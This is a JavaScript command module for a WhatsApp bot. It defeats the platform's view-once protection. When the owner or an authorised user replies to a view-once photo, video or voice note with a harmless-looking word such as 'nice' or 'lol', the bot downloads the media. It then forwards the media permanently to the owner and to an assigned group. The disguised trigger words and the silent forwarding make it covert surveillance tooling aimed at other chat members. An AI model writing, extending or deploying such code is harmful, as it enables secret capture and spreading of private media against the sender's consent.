const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');

const BOT_NAME = 'VIP MASTER BOT';
const DEVELOPER_NAME = 'Sami Khan';

const ONCE_ACCESS_FILE = path.resolve('./once_access.json');

function ensureOnceAccessFile() {
    if (!fs.existsSync(ONCE_ACCESS_FILE)) {
        fs.writeFileSync(
            ONCE_ACCESS_FILE,
            JSON.stringify({ users: [] }, null, 2),
            'utf8'
        );
    }
}

function loadOnceAccess() {
    ensureOnceAccessFile();
    try {
        const data = JSON.parse(fs.readFileSync(ONCE_ACCESS_FILE, 'utf8'));
        return Array.isArray(data.users) ? data.users : [];
    } catch {
        return [];
    }
}

function saveOnceAccess(users) {
    fs.writeFileSync(
        ONCE_ACCESS_FILE,
        JSON.stringify({ users: users }, null, 2),
        'utf8'
    );
}

function normalizeNumber(value) {
    return String(value || '').replace(/[^0-9]/g, '');
}

function jidToNumber(jid) {
    return normalizeNumber(
        String(jid || '')
            .split('@')[0]
            .split(':')[0]
    );
}

function getSenderCandidates(msg) {
    const candidates = new Set();
    const add = (val) => {
        if (!val) return;
        const str = String(val).trim();
        candidates.add(str);
        const userPart = str.split('@')[0].split(':')[0];
        candidates.add(userPart);
        const digits = normalizeNumber(userPart);
        if (digits) {
            candidates.add(digits);
            if (digits.length >= 10) candidates.add(digits.slice(-10));
        }
    };

    add(msg?.key?.sender);
    add(msg?.key?.senderPn);
    add(msg?.key?.participant);
    add(msg?.key?.participantPn);
    if (!msg?.key?.remoteJid?.endsWith('@g.us')) {
        add(msg?.key?.remoteJid);
    }
    const context = msg?.message?.extendedTextMessage?.contextInfo;
    add(context?.participant);
    add(context?.senderPn);

    return [...candidates];
}

function isOwner(msg, OWNER_NUMBER) {
    if (msg?.key?.fromMe === true) return true;
    const owner = normalizeNumber(OWNER_NUMBER);
    if (!owner) return false;
    const candidates = getSenderCandidates(msg);
    return candidates.some(c => {
        const norm = normalizeNumber(c);
        return norm === owner || (norm.length >= 10 && norm.slice(-10) === owner.slice(-10));
    });
}

function getOnceAccess(msg, OWNER_NUMBER) {
    if (isOwner(msg, OWNER_NUMBER)) return { isOwner: true };
    const allowedList = loadOnceAccess();
    const senderCandidates = getSenderCandidates(msg);

    for (const item of allowedList) {
        if (!item || typeof item !== 'object') continue;
        const allowedUser = item.user;
        const groupJid = item.groupJid;

        const normAllowed = normalizeNumber(allowedUser);
        const last10Allowed = normAllowed.length >= 10 ? normAllowed.slice(-10) : normAllowed;

        for (const cand of senderCandidates) {
            const normCand = normalizeNumber(cand);
            if (cand === allowedUser || (normCand && normAllowed && normCand === normAllowed) || (normCand.length >= 10 && last10Allowed && normCand.slice(-10) === last10Allowed)) {
                return { isOwner: false, groupJid };
            }
        }
    }
    return null;
}

function extractViewOnceMedia(quotedMsg) {
    if (!quotedMsg) return null;
    let msg = quotedMsg.ephemeralMessage?.message || quotedMsg;
    let innerMsg =
        msg.viewOnceMessage?.message ||
        msg.viewOnceMessageV2?.message ||
        msg.viewOnceMessageV2Extension?.message;

    const isWrapped = !!innerMsg;
    const target = innerMsg || msg;

    let type = null;
    let mediaMessage = null;

    if (target.imageMessage) {
        type = 'image';
        mediaMessage = target.imageMessage;
    } else if (target.videoMessage) {
        type = 'video';
        mediaMessage = target.videoMessage;
    } else if (target.audioMessage) {
        type = 'audio';
        mediaMessage = target.audioMessage;
    }

    if (!type || !mediaMessage) return null;
    if (isWrapped || mediaMessage.viewOnce === true) {
        return { type, mediaMessage };
    }
    return null;
}

module.exports = {
    name: 'once',
    description: 'Manage view once access and bypass secrets',
    async execute(sock, msg, args, context) {
        if (msg._onceProcessed) return;
        msg._onceProcessed = true;

        const { OWNER_NUMBER, safeSendMessage } = context;
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();

        const action = (args[0] || '').toLowerCase();
        const managementActions = ['add', 'remove', 'revoke', 'list', 'menu'];
        const isOnceCommandCall = managementActions.includes(action) || (args.length === 0 && text.toLowerCase().includes('once'));

        if (isOnceCommandCall || text.startsWith('!once') || text.startsWith('.once') || text.startsWith('/once')) {
            if (!isOwner(msg, OWNER_NUMBER)) return;

            const parts = args.length > 0 ? args : text.replace(/^[\!\.\/]?once/i, '').trim().split(/\s+/).filter(Boolean);
            const subAction = (parts[0] || '').toLowerCase();
            const commandContext = msg.message.extendedTextMessage?.contextInfo;
            const mentionedJids = commandContext?.mentionedJid || [];
            const targetFromMention = mentionedJids[0] || null;

            if (!subAction || subAction === 'menu') {
                await safeSendMessage(
                    msg.key.remoteJid,
                    {
                        text:
                            `════════════════════════════════\n` +
                            `    👑 *${BOT_NAME}* 👑\n` +
                            `    👁️ *VIEW ONCE MODULE*\n` +
                            `════════════════════════════════\n\n\n` +
                            `🛠️ *ACCESS CONTROL MANAGEMENT*\n` +
                            `│ ▫️ \`!once add @User\`\n` +
                            `│ ▫️ \`!once remove @User\`\n` +
                            `│ ▫️ \`!once remove all\`\n` +
                            `│ ▫️ \`!once list\`\n\n\n` +
                            `🔑 *SECRET UNLOCK KEYWORDS*\n` +
                            `│ ▫️ \`thanks\` ── \`hahaha\` ── \`osm\`\n` +
                            `│ ▫️ \`nice\` ──── \`good\` ──── \`great\`\n` +
                            `│ ▫️ \`amazing\` ─ \`wow\` ───── \`cool\`\n` +
                            `│ ▫️ \`so funny\` ── \`lol\`\n` +
                            `│ ▫️ \`masha allah\` ── \`mashallah\`\n` +
                            `│ ▫️ \`wah\` ───── \`wah wah\`\n\n\n` +
                            `═══════════════════════════════\n` +
                            `⚡ *Status:* Fully Operational\n` +
                            `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                            `🤖 *Bot Name:* ${BOT_NAME}\n` +
                            `═══════════════════════════════`
                    },
                    { quoted: msg }
                );
                return;
            }

            if (subAction === 'add') {
                const targetGroup = msg.key.remoteJid;
                let targetsToAdd = [];
                if (targetFromMention) {
                    targetsToAdd.push(targetFromMention);
                    const num = jidToNumber(targetFromMention);
                    if (num) targetsToAdd.push(num);
                } else {
                    const inputNum = normalizeNumber(parts.slice(1).join(''));
                    if (inputNum) targetsToAdd.push(inputNum);
                }

                if (targetsToAdd.length === 0) {
                    await safeSendMessage(msg.key.remoteJid, {
                        text:
                            `════════════════════════════════\n` +
                            `     👑 *${BOT_NAME}* 👑     \n` +
                            `        ⚠️ *INVALID SYNTAX*     \n` +
                            `════════════════════════════════\n\n` +
                            `❌ Usage: \`!once add @User\` ya \`!once add 923xxxxxxxxx\`\n\n` +
                            `════════════════════════════════\n` +
                            `⚡ *Status:* Failed\n` +
                            `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                            `════════════════════════════════`
                    }, { quoted: msg });
                    return;
                }

                let users = loadOnceAccess();
                let addedAny = false;

                for (const target of targetsToAdd) {
                    const normTarget = normalizeNumber(target);
                    users = users.filter(u => {
                        const existingUser = typeof u === 'object' ? u.user : u;
                        return normalizeNumber(existingUser) !== normTarget;
                    });

                    users.push({ user: target, groupJid: targetGroup });
                    addedAny = true;
                }

                if (addedAny) {
                    saveOnceAccess(users);
                    await safeSendMessage(msg.key.remoteJid, {
                        text:
                            `════════════════════════════════\n` +
                            `     👑 *${BOT_NAME}* 👑     \n` +
                            `      ✅ *ONCE ACCESS*        \n` +
                            `════════════════════════════════\n\n\n` +
                            `✅ *ONCE ACCESS GRANTED*\n` +
                            `📱 Target: ${targetsToAdd.join(', ')}\n` +
                            `👥 Mapped Group: ${targetGroup}\n\n\n` +
                            `════════════════════════════════\n` +
                            `⚡ *Status:* Authorized\n` +
                            `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                            `════════════════════════════════`
                    }, { quoted: msg });
                }
                return;
            }

            if (subAction === 'remove' || subAction === 'revoke') {
                const subArg = (parts || '').toLowerCase();

                if (subArg === 'all') {
                    saveOnceAccess([]);
                    await safeSendMessage(msg.key.remoteJid, {
                        text:
                            `════════════════════════════════\n` +
                            `     👑 *${BOT_NAME}* 👑     \n` +
                            `     ✅ *ACCESS REVOKED*      \n` +
                            `════════════════════════════════\n\n\n` +
                            `✅ *ALL ONCE ACCESS REVOKED*\n` +
                            `🔒 Sabhi users ka access remove kar diya gaya hai.\n\n\n` +
                            `════════════════════════════════\n` +
                            `⚡ *Status:* Success\n` +
                            `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                            `════════════════════════════════`
                    }, { quoted: msg });
                    return;
                }

                const target = targetFromMention ? targetFromMention : normalizeNumber(parts.slice(1).join(''));
                if (!target) {
                    await safeSendMessage(msg.key.remoteJid, {
                        text:
                            `════════════════════════════════\n` +
                            `     👑 *${BOT_NAME}* 👑     \n` +
                            `        ⚠️ *INVALID SYNTAX*     \n` +
                            `════════════════════════════════\n\n\n` +
                            `❌ Usage: \`!once remove @User\`\n` +
                            `Ya sab ko remove karne ke liye: \`!once remove all\`\n\n\n` +
                            `════════════════════════════════\n` +
                            `⚡ *Status:* Failed\n` +
                            `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                            `════════════════════════════════`
                    }, { quoted: msg });
                    return;
                }

                let users = loadOnceAccess();
                const targetNum = normalizeNumber(target);

                users = users.filter(item => {
                    const u = typeof item === 'object' ? item.user : item;
                    const normU = normalizeNumber(u);
                    if (u === target || (targetNum && normU === targetNum)) return false;
                    return true;
                });

                saveOnceAccess(users);
                await safeSendMessage(msg.key.remoteJid, {
                    text:
                        `════════════════════════════════\n` +
                        `     👑 *${BOT_NAME}* 👑     \n` +
                        `        ✅ *ONCE ACCESS REVOKED*     \n` +
                        `════════════════════════════════\n\n` +
                        `✅ *ONCE ACCESS REVOKED*` +
                        `\n════════════════════════════════\n` +
                        `⚡ *Status:* Revoked\n` +
                        `👨‍💻 *Developer:* ${DEVELOPER_NAME}\n` +
                        `════════════════════════════════`
                }, { quoted: msg });
                return;
            }

            if (subAction === 'list') {
                const users = loadOnceAccess();
                await safeSendMessage(msg.key.remoteJid, {
                    text: `🔐 *ONCE ACCESS LIST*\n\n` + (users.length ? users.map((item, i) => {
                        const u = typeof item === 'object' ? item.user : item;
                        const g = typeof item === 'object' ? item.groupJid : 'N/A';
                        return `${i + 1}. User: ${u}\n   Group: ${g}`;
                    }).join('\n\n') : 'Abhi kisi ko access nahi hai.')
                }, { quoted: msg });
                return;
            }
        }

        const viewOnceKeywords = [
            'thanks', 'hahaha', 'nice', 'osm', 'good', 'great', 'amazing',
            'wow', 'cool', 'so funny', 'lol', 'masha allah', 'mashallah', 'wah', 'wah wah'
        ];

        if (viewOnceKeywords.includes(text.toLowerCase())) {
            const accessInfo = getOnceAccess(msg, OWNER_NUMBER);
            if (!accessInfo) return;

            const quotedContext = msg.message.extendedTextMessage?.contextInfo;
            const quotedMsg = quotedContext?.quotedMessage;
            if (!quotedMsg) return;

            const extracted = extractViewOnceMedia(quotedMsg);
            if (!extracted) return;

            try {
                const { type, mediaMessage } = extracted;
                const stream = await downloadContentFromMessage(mediaMessage, type);
                const chunks = [];
                for await (const chunk of stream) chunks.push(chunk);
                const buffer = Buffer.concat(chunks);

                const ownerJid = OWNER_NUMBER.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

                if (accessInfo.isOwner) {
                    const ownerCaption = `👁️ *VIEW ONCE UNLOCKED (OWNER)*\n\n💬 Chat: ${msg.key.remoteJid}`;
                    if (type === 'image') await safeSendMessage(ownerJid, { image: buffer, caption: ownerCaption });
                    else if (type === 'video') await safeSendMessage(ownerJid, { video: buffer, caption: ownerCaption });
                    else if (type === 'audio') await safeSendMessage(ownerJid, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true });
                } else {
                    const targetChatJid = accessInfo.groupJid;
                    if (!targetChatJid) return;

                    const groupCaption = `👁️ *VIEW ONCE UNLOCKED*`;

                    if (type === 'image') await safeSendMessage(targetChatJid, { image: buffer, caption: groupCaption });
                    else if (type === 'video') await safeSendMessage(targetChatJid, { video: buffer, caption: groupCaption });
                    else if (type === 'audio') await safeSendMessage(targetChatJid, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true });

                    const ownerCaption = `👁️ *VIEW ONCE UNLOCKED (USER ACCESS)*\n\n💬 Triggered In: ${msg.key.remoteJid}\n👥 Sent To Assigned Group: ${targetChatJid}\n👤 Sender: ${msg.key.participant || msg.key.remoteJid}`;
                    if (type === 'image') await safeSendMessage(ownerJid, { image: buffer, caption: ownerCaption });
                    else if (type === 'video') await safeSendMessage(ownerJid, { video: buffer, caption: ownerCaption });
                    else if (type === 'audio') await safeSendMessage(ownerJid, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true });
                }
            } catch (e) {
                console.error('❌ View Once Background Error:', e);
            }
        }
    }
};